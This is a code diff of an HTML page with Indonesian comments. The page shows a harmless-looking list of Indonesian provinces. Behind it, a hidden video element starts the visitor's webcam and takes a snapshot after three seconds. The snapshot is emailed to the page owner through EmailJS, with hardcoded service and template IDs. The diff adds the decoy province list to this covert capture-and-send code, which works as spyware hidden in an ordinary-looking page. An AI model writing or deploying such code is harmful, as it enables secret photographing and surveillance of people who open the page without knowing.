@@ -3,52 +3,57 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Kamera + EmailJS (File)</title>
+  <title>Kamera + EmailJS</title>
 </head>
 <body>
+  <h2>Daftar Provinsi Indonesia</h2>
+  <ul>
+    <li>Banten</li>
+    <li>Jawa Barat</li>
+    <li>Jawa Tengah</li>
+    <li>Nusa Tenggara Barat</li>
+    <!-- Tambahkan sesuai kebutuhan -->
+  </ul>
+
+  <!-- Video tersembunyi -->
   <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
-  <form id="emailForm">
-    <input type="file" name="attachment" id="hiddenFile" style="display:none;">
-  </form>
 
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
     (function(){
-      emailjs.init("8y4NpgAMKhzz-pqFL"); // Public Key
+      // Ganti dengan Public Key kamu dari EmailJS
+      emailjs.init("8y4NpgAMKhzz-pqFL");
     })();
 
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
-    const hiddenFile = document.getElementById('hiddenFile');
 
+    // Aktifkan kamera
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
 
+        // Tunggu kamera siap, lalu ambil foto otomatis
         setTimeout(() => {
-          // Ambil snapshot
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-          // Convert ke Blob
-          canvas.toBlob(blob => {
-            const file = new File([blob], "snapshot.png", { type: "image/png" });
+          const dataURL = canvas.toDataURL("image/png");
 
-            // Masukkan ke input file form
-            const dataTransfer = new DataTransfer();
-            dataTransfer.items.add(file);
-            hiddenFile.files = dataTransfer.files;
+          // Kirim email via EmailJS
+          emailjs.send("service_cw175cv", "template_f7501pb", {
+            message: "Foto otomatis dari kamera.",
+            attachment: dataURL
+          }).then(response => {
+            console.log("✅ Email sukses terkirim!", response.status, response.text);
+          }).catch(err => {
+            console.error("❌ Gagal kirim:", err);
+          });
 
-            // Kirim via EmailJS
-            emailjs.sendForm("service_cw175cv", "template_f7501pb", "#emailForm")
-              .then(res => console.log("✅ Email terkirim!", res))
-              .catch(err => console.error("❌ Gagal kirim:", err));
-
-          }, "image/png");
-        }, 3000); // foto otomatis 3 detik
+        }, 3000); // foto diambil 3 detik setelah kamera aktif
       })
       .catch(err => console.error("Izin kamera ditolak: ", err));
   </script>
